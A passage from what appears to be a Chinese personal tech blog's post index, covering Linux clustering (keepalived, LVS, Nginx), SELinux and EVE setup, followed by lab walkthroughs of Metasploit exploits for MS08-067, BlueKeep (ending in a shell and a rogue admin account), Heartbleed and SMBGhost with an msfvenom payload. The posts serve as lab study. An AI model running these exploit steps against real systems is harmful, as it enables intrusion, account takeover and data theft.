:---------------: |\n| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |\n| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |\n\n* mariadb-1 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置模块\n\n```bash 折叠代码\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\t# 管理员邮箱\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_master\t# 标识\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段  \n\n```bash 折叠代码\nvrrp_instance mariadb-ha {\n    state BACKUP\t# 备用\n    interface ens224\n    nopreempt\t\t# 设置不抢占\n    virtual_router_id 60\n    priority 100\t# 优先级\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\t# 配合vrrp_script段使用\n        check_mariadb\n    }\n    virtual_ipaddress {\t# 虚拟出的VIP\n        172.21.8.50/24\n    }\n}\n```\n\n* mariadb-2 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置段\n\n```bash 折叠代码\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_slave\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段\n\n```bash 折叠代码\nvrrp_instance mariadb-ha {\n    state BACKUP\n    interface ens224\n    virtual_router_id 60\n    priority 90\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\n        check_mariadb\n    }\n    virtual_ipaddress {\n        172.21.8.50/24\n    }\n```\n\n4. 在两个主机上编写服务检测脚本`/etc/keepalived/checkmariadb.sh`\n\n```bash\n#!/bin/bash\nif ! lsof -i:3306 &> /dev/null\nthen\n    systemctl stop keepalived\nfi\n```\n\n5. 启动两台服务器的`keepalived`\n\n```bash\nsystemctl start keepalived.service\n```\n\n![keepalived 配置成功](./keepalived-linux/7.png)\n\n可以看出mariadb-1主机已经多出来一个172.21.8.50/24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。\n","tags":["Linux","MySQL"],"categories":["技术"]},{"title":"EVE导入CENTOS8的镜像","url":"/2023/05/31/eve-import-img/","content":"\n\n\n最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。\n\n### 前期准备\n\n首先需要EVE的导入镜像，我只用到了CENTOS8的，[相关链接](https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA) 放在了云盘里，提取码：0731，需要自取。虚拟机的`user`用户和`root`密码均为`Test123`。\n\n<!-- more -->\n\n### 操作步骤\n\n1. 使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为`/opt/unetlab/addons/qemu/`\n\n2. 接着使用命令解压这个文件\n\n```bash\ntar -xf linux-centos-8.tgz\n```\n\n3. 执行命令修正权限。\n\n```bash\n/opt/unetlab/wrappers/unl_wrapper -a fixpermissions\n```\n\n>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。\n\n4. 最后大功告成，在EVE网页中可以使用了(鼠标右击-->node-->linux-->image)。\n\n![导入成功](./eve-import-img/1.png)\n\n---\n\n### 补充\n\n应***汪某人***的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。\n\n* 首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是`root`，密码是`eve`。但其实密码是不对的，密码是`cisco`。不清楚是不是因为版本的问题。总之，如果`eve`不好使，就换成`cisco`试试。\n\n* 连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，[链接在这](https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip) 。\n\n![windterm](./eve-import-img/2.png)\n\n","tags":["EVE"],"categories":["学习过程"]},{"title":"关于seliunx的学习过程","url":"/2023/05/24/seliunx/","content":"\n### 修改文件SELinux的上下文\n\n#### 实验目的：修改文件的selinux上下文标签，把`/home/student`目录的selinux上下文标签替换为`/root`目录的selinux上下文标签。\n\n * 查看student目录的selinux\n\n```bash\n[root@servera home]# ls -dZ student/\nunconfined_u:object_r:user_home_dir_t:s0 student/\n```\n\n<!-- more -->\n\n**user_home_dir_t**的部分就是`/home/student`的selinux的上下文。\n\n * 查看root目录的selinux\n\n```bash\n[root@servera /]# ls -Zd /root/\nsystem_u:object_r:admin_home_t:s0 /root/\n```\n\n**admin_home_t**的部分就是`/root`的selinux的上下文。\n\n* 修改命令\n\n```bash\n[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'\n```\n\n`'/home/student(/.*)?'`部分后面的`(/.*)?`是固定的。\n\n* 使配置生效\n\n```bash\n[root@servera /]# restorecon -RFvv /home/student/\nRelabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\n```\n\n* 再次查看student目录的selinux\n\n```bash\n[root@servera /]# ls -dZ /home/student/\nsystem_u:object_r:admin_home_t:s0 /home/student/\n```\n\n发现student目录的selinux值变成了**admin_home_t**。\n\n---","tags":["Linux"],"categories":["学习过程"]},{"title":"使用LVS+Nginx配置DR模式的Web集群","url":"/2023/05/18/LVS-Nginx-DR/","content":"\n### 准备工作\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|:---:|:---:|:---:|:---:|:---:|:---:|\n|DS|调度服务器|ens224|仅主机|172.21.8.80/24|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|nginx|\n|web1|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|nginx|\n|web2|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n\nPS:\n\n1. 建议DS（调度机）的网卡使用仅主机模式的。\n2. web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。\n<!-- more -->\n3. 可以使用```route -n```查看**metric**值。\n4. **metric**值可以在网卡配置文件中修改，修改后记得重启网络服务生效。\n\n### DS主机配置\n\n```bash\nipvsadm -A -t 172.21.8.80:80 -s wrr\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2\nipvsadm --set 1 1 1\n```\n\n调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。\n\n也可以直接编辑成一个脚本文件，方便后面进行策略的调整\n\n```bash\n#!/bin/bash\nipvsadm -C\nipvsadm -A -t 10.8.7.10:80 -s wrr\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2\nipvsadm --set 1 1 1\necho \"轮巡策略已成功添加！！！\"\n```\n\n### Web1主机和Web2主机配置\n\n* 配置回环接口（VIP）\n\n```bash\nip addr add 172.21.8.80/32 dev lo\n```\n\n因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本\n\n```bash\n#!/bin/bash\nip addr add 10.8.7.10/32 dev lo:1\necho \"VIP 已经成功添加到loopback口。\"\n```\n\n* 修改Web1内核控制系统arp响应\n\n  因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。\n\n```bash 折叠代码\n#!/bin/bash\nif [ $# -ne 1 ]\nthen\n    echo 'error!'\"usage:$0 on|off\"\n    exit 1\nfi\ncase $1 in\n    on)\n        echo \"1\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"1\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已开启！\"\n        ;;\n    off)\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已关闭！\"\n        ;;\n    *)\n        echo 'error!'\"usage:$0 on|off\"\n        exit 1\nesac\n```\n\n* 执行脚本\n\n```bash\nchmod +x lvs_dr.sh\n./lvs_dr.sh on\n```\n\n### 测试\n\n1. 在Web1、Web2启动Nginx。\n2. 分别执行```curl 172.21.8.20```，```curl 172.21.8.30```。验证无误后，在客户端（第4台机器）上测试```curl 172.21.8.80```，使用**DR**机器是不好使的。\n\n>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。","tags":["Linux"],"categories":["技术"]},{"title":"Linux使用小tips","url":"/2023/05/18/linux-tips/","content":"\n### 常用的一些操作\n\n1. 永久修改SELINUX值。\n\n使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置```setenforce 0```就太麻烦了。所以直接编辑```/etc/selinux/config```文件，设置```SELINUX=permissive```，最后保存退出。\n\n2. 永久修改网卡的IP地址。\n\n在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。\n\n<!-- more -->\n\n网卡配置文件```/etc/sysconfig/network-scripts/ifcfg-ens160```。分成几点来说。\n\n* BOOTPROTO=none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。\n\n* ONBOOT=yes，设置开机网卡自启的，建议设置为*yes*，可选值还有*no*\n\n* 如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上\n\n```bash\nIPADDR=192.168.20.10    # *设置IP*\nGATEWAY=192.168.20.254    # *设置网关*\nPREFIX=24    # *设置子网掩码*\n```\n\n有的配置文件还可以看到\n\n```bash\nDNS1=8.8.8.8\nDNS2=114.144.144.114\n```\n\n但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（```/etc/resolv.conf```），二就是它会和```/etc/resolv.conf```文件指定的DNS相互冲突。\n\n* 更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n这样**3**条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。","tags":["Linux"],"categories":["小玩意儿"]},{"title":"新的Linux虚拟机快速基本配置","url":"/2023/05/18/linux-init/","content":"\n### 配置阿里yum源\n\n1. 首先保证虚拟机可以正常访问网络。\n2. 执行命令，下载yum源。(CENTOS-7)\n\n```bash\ncurl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\nCENTOS-8 yum源\n\n```bash\ncurl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-8.repo\n```\n\n<!-- more -->\n\n3. 清除yum缓存，重新生成。\n\n```bash\nyum clean all && yum makecache\n```\n\nPS:\n\n**CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。**\n\n### 必备的软件\n\n1. **vim工具**，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。\n\n```bash\nyum install -y vim\n```\n\n2. **wget**工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。\n\n```bash\nyum install -y wget\n```\n\n3. **bash-completion**包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。\n\n```bash\nyum install -y bash-completion\n``` \n\n4. **tree工具**，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。\n\n```bash\nyum install -y tree\n```\n\n6. **net-tools**，这个工具提供了比如`ifconfig`，`netstat`，`arp`，`route`命令，有时候用起来发现没有这个命令的话，记得安装这个包。\n\n```bash\nyum install -y net-tools\n```\n\n5. **lsof工具**，查看端口监听的常用工具，个人来讲使用频率高于`netstat`，使用也比较方便，可以安装一个。\n\n```bash\nyum install -y lsof\n```\n\n配置完这些，基础的东西就可以告一段落了。","tags":["Linux"],"categories":["小玩意儿"]},{"title":"使用LVS+Nginx配置NAT模式的Web集群","url":"/2023/05/17/LVS-Nginx-NAT/","content":"\n### 准备条件\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|主机名|身份|网络接口|连接模式|IP地址|网关|软件|\n|:---:|:---:|:---:|:---:|:---:|:---:|:---:|\n|DS|调度服务器|ens160|nat|192.168.20.40/24|192.168.20.254|ipvsadm|\n|DS|调度服务器|ens224|仅主机|172.21.8.10/24|-|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|172.21.8.10/24|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|172.21.8.10/24|nginx|\n\nPS:\n\n1. DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。\n2. DS的两块网卡最好模式是不一样的。\n\n<!-- more -->\n\n### DS的配置\n\n下载ipvsadm\n\n```bash\nyum install -y ipvsadm\n```\n\n添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。\n\n```bash\nipvsadm -A -t 192.168.20.40:80 -s rr\n```\n\n为虚拟服务器添加后端真实服务器\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n使用命令查看生成的策略\n\n```bash\nipvsadm -Ln\n```\n\n开启路由转发功能\n\n```bash\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n```\n\n使用命令修改轮训的时间\n\n```bash\nipvsadm --set 1 1 1\n```\n\n使用命令查看超时时间设置\n\n```bash\nipvsadm -L --timeout\n```\n\n### WEB1配置\n\n下载Nginx\n\n```bash\nyum install -y nginx\n```\n\nnginx的配置文件保存在```/etc/nginx/nginx.conf```\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash 折叠代码\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.20;    # 本机IP\n        location / {\n            root   /web;    # 根目录地址\n            index  index.html index.htm;    # 要去寻找的文件\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web1111\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### WEB2配置\n\nweb2配置基本同web1。\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash 折叠代码\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.30;\n        location / {\n            root   /web;\n            index  index.html index.htm;\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web2222\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### 测试\n\n先在web1主机\n\n```bash\ncurl 172.21.8.20\n```\n\n然后在web2主机\n\n```bash\ncurl 172.21.8.30\n```\n\n最后在DS主机上\n\n```bash\ncurl 192.168.20.40\n```\n\n如果观察到```web1111```和```web2222```来回显示在页面上则配置成功。\n\n### 其他可能用到的命令\n\nLinux查看路由表\n\n```bash\nip r s\n```\n\n重启Nginx的命令\n\n```bash\nnginx -s reload\n```\n\n关闭Nginx的命令\n\n```bash\nnginx -s stop\n```","tags":["Linux"],"categories":["技术"]},{"title":"CVE漏洞成功复现的玄学条件","url":"/2023/05/07/CVE-extend/","content":"\n### 正文\n\n总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。\n\n但还是有两点得补充一下\n\n<!-- more -->\n\n1. 在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。\n\n2. 设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。","tags":["网络安全"],"categories":["技术"]},{"title":"远程命令执行（ms08-067）（CVE-2008-4250）","url":"/2023/04/23/ms08-067/","content":"\n### 准备工作\n\n攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux，可以使用命令```uname -a```查看。\n\n靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。\n\n<!-- more -->\n\n```bash\ned2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/\n```\n\n### 域内扫描\n\n攻击第一步，先扫描网络内存活并可以利用的主机。\n\n```bash\nnmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n### 开始攻击\n\n1. 执行```msfconsole -q```。\n2. 搜索```ms08-067```。\n\n![开启工具](./ms08-067/1.png)\n\n3. 设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用```show options```先查看都需要让我们设置哪些参数。\n\n![使用模块](./ms08-067/2.png)\n\n4. 设置参数。上图看到，我们需要设置```rhosts```（靶机IP）。\n\n![设置参数](./ms08-067/3.png)\n\n5. 然后设置payload reverse_tcp\n\n![设置参数](./ms08-067/4.png)\n\n6. 最后设置靶机的类型，在这我选择34。\n\n![设置参数](./ms08-067/5.png)\n\n7. 设置好就可以开始攻击了。\n\n![设置参数](./ms08-067/6.png)\n\n最后返回meterpreter，攻击成功。","tags":["网络安全"],"categories":["技术"]},{"title":"在OpenStack上分发虚拟机实例","url":"/2023/04/23/openstack-deploy/","content":"\n### 镜像\n\nOpenStack的存放镜像的位置在image目录下，作为演示，我们待会就使用这个cirros镜像。\n\n![镜像](https://lxp731.github.io/img/openstack/images.png)\n\n### 规格\n\nOpenStack分发虚拟机时，可以自定义一个分发的模板，这个模板就在flavors目录下，此时还是空，我们先创建一个flavor。\n\n<!-- more -->\n\n![模板](https://lxp731.github.io/img/openstack/flavors.png)\n\n按照自己的需求，可以创建flavor模板\n\n| | |\n|:--|:--|\n|VCPU|虚拟CPU的数量|\n|ID|默认就好|\n|RAM|内存大小|\n|ROOT DISK|根磁盘大小|\n|其他选项|全部默认|\n\n![flavor](https://lxp731.github.io/img/openstack/create_flavors.png)\n\n创建好之后，就会生成这样的一个flavor。\n\n![flavor](https://lxp731.github.io/img/openstack/succeed_flavors.png)\n\n### 网络\n\n和分发规格一样，我们同时可以自定义网络的模板,默认是会存在一个模板的，我们使用默认的模板，不再进行创建新的模板了，当然你可以按照个人的需求进行创建。\n\n![network](https://lxp731.github.io/img/openstack/network.png)\n\n### 发放虚拟机实例\n\n我们到project的instances目录，这里还没有虚拟机实例，我们来创建一个。\n\n![network](https://lxp731.github.io/img/openstack/instances.png)\n\n1. 点击右上角的```launch instances```。\n\n2. 设置details，名字自己起，描述选填，其他默认就好，然后next。\n\n![network](https://lxp731.github.io/img/openstack/details.png)\n\n3. 设置source，为了节省空间我选择不再创建新的卷，然后将下面的模板直接应用，点旁边的上箭头应用，然后next。\n\n![network](https://lxp731.github.io/img/openstack/source.png)\n\n4. 设置flavor，这里有我们刚刚创建的flavor模板，我们直接点旁边的上箭头。\n\n![network](https://lxp731.github.io/img/openstack/flavor.png)\n\n5. 最后设置network，默认已经选好了。那么，计算资源，存储资源，网络资源我们都配置好了，就可以直接发布虚拟机了，点击右下角的按钮分发实例。\n\n6. 稍作等待，就会出现下面这个页面，等实例处于active时，就大功告成了。\n\n![network](https://lxp731.github.io/img/openstack/finish.png)","tags":["Openstack"],"categories":["探索"]},{"title":"远程桌面提权（CVE-2019-0708）","url":"/2023/04/22/CVE-2019-0708/","content":"\n### 准备工作\n\n首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。\n\n### 开始攻击\n\n1. 还是使用我们熟悉的```msfconsole```工具,进入之后搜索***0708***。\n\n<!-- more -->\n\n![启动工具](./CVE-2019-0708/1.png)\n\n2. 使用编号是1的模块，然后设置***payload***，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个```shell```。使用```options```查看需要设置的参数，从图中可以看到需要设置目标机器的IP。\n\n![启动工具](./CVE-2019-0708/2.png)\n\n3. 我们需要额外设置一个参数```targets```。使用```show targets```查看选项，选择最贴合我们情况的，我选择了windows的VMware。\n\n![启动工具](./CVE-2019-0708/3.png)\n\n4. 设置完就可以run起来了，稍作等待，成功返回```shell```,验证一下我们的权限，是系统用户没有错。\n\n![启动工具](./CVE-2019-0708/4.png)\n\n5. 我们尝试在系统中添加一个用户***hacker***，密码设置为“1234”。\n\n![启动工具](./CVE-2019-0708/5.png)\n\n6. 然后把***hacker***添加到管理员组。\n\n![启动工具](./CVE-2019-0708/6.png)\n\n7. 再启动一个终端，输入```rdesktop 192.168.20.130```，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。\n\n![启动工具](./CVE-2019-0708/7.png)\n\n8. 最后kali成功远程登录windows，任务完成。\n\n![启动工具](./CVE-2019-0708/8.png)","tags":["网络安全"],"categories":["技术"]},{"title":"心脏滴血原理与复现","url":"/2023/04/22/heartbleed/","content":"\n### 前期准备\n\n攻击机器还是kali，靶机这里用到的是[beebox](https://sourceforge.net/projects/bwapp/files/bee-box/)，下载完之后解压导入虚拟机就可以开始使用了。\n\n### nmap扫描\n\n攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。\n\n<!-- more -->\n\n```bash\n  nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。\n\n![扫描结果](./heartbleed/1.png)\n\n### 脚本探测\n\n看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。\n\n```bash\n  nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse\n```\n\n文字显示是“VULNERABLE”，代表漏洞可以被利用。\n\n![脚本探测](./heartbleed/2.png)\n\n### 开始攻击\n\n打开```msfconsole```工具，搜索```heartbleed```，使用1。\n\n```bash\n  msfconsole -q\n  search heartbleed\n  use 1\n```\n\n![参数设置](./heartbleed/4.png)\n\n使用```show options```查看相应的参数并设置，包括```rport```，```rhost```，```verbose```。\n\n```bash\n  set rport 8443\n  set rhost 192.168.20.136\n```\n\n![参数设置](./heartbleed/5.png)\n\n![参数设置](./heartbleed/8.png)\n\n其中```verbose```是要在```show advanced```下查看的，默认是```false```，我们```set verpose true```设置为```true ```，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。\n\n```bash\n  show advanced\n  set verbose true\n```\n\n![参数设置](./heartbleed/3.png)\n\n最后可以用```show missing```查看遗漏的设置参数，没有遗漏，就可以开始运行了。\n\n```bash\n  show missing\n  run\n```\n\n![参数设置](./heartbleed/6.png)\n\nkali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。\n\n![参数设置](./heartbleed/9.png)\n\n最后我们回到kali，发现已经拿到数据了。\n\n![参数设置](./heartbleed/7.png)\n\n心脏滴血的复现到这里就完成了。","tags":["网络安全"],"categories":["技术"]},{"title":"永恒之黑（CVE-2020-0796）","url":"/2023/04/21/CVE-2020-0796/","content":"\n### 惭愧声明\n稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。\n\n### 准备工作\n\n首先，准备一台kali和一台运行1903版本或者1909版本的windows10。\n\n<!-- more -->\n\n关闭windows10的防火墙和实时保护功能。\n\n在kali上准备待会要用到的工具。\n\n1. 启用扫描脚本\n\n```git\n  git clone https://github.com/ollypwn/SMBGhost.git\n```\n\n有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。\n\n2. 下载EXP脚本\n\n```git\n  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git\n```\n\n### 扫描bug\n\n准备好扫描脚本后进入该目录，执行：\n\n```python\n  python3 scanner.py 192.168.20.135\n```\n\n\"192.168.20.135\"更换为自己靶机的IP。下面是效果图，显示\"Vulnerable\"，易受攻击的。\n\n![bug扫描](./CVE-2020-0796/1.png)\n\n### 准备payload\n\n进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：\n\n```bash\n  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload\n```\n\n执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：\n\n1. 打开payload。\n\n2. 打开exploit.py。\n\n3. 将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。\n\n4. 复制替换完成的payload文件内容。\n\n5. 粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。\n\n![修改payload](./CVE-2020-0796/2.png)\n\n### 开始攻击\n\n1. 启动```msfconsole```。\n\n2. 使用模块。\n\n3. 设置有效载荷和相关参数。\n\n依次执行以下命令：\n\n```bash\n  msfconsole -q\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/bind_tcp\n  set lport 4444\n  set rhost 192.168.20.135\n  run\n```\n\n![攻击](./CVE-2020-0796/3.png)\n\n再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：\n\n```bash\n  python3 exploit.py -ip 192.168.20.135\n```\n\n![运行 exploit.py](./CVE-2020-0796/4.png)\n\n出现这步后按下回车。\n\n然后回到win10，发现win10蓝屏正在重启。\n\n![win10重启](./CVE-2020-0796/5.png)\n\n如果完成的彻底，```msfconsole```终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。\n\n![拿到shell](./CVE-2020-0796/6.png)\n\n---\n\n手动分割线\n\n---\n\n### 玄学排错\n\n接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。\n\n1. 把靶机的内存设置大一点，我直接给到了8G。\n\n2. kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。\n\n3. 在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。\n\n4. 在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。\n\n5. 更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了[百度云盘](https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang)里，提取码：0731。\n\n### 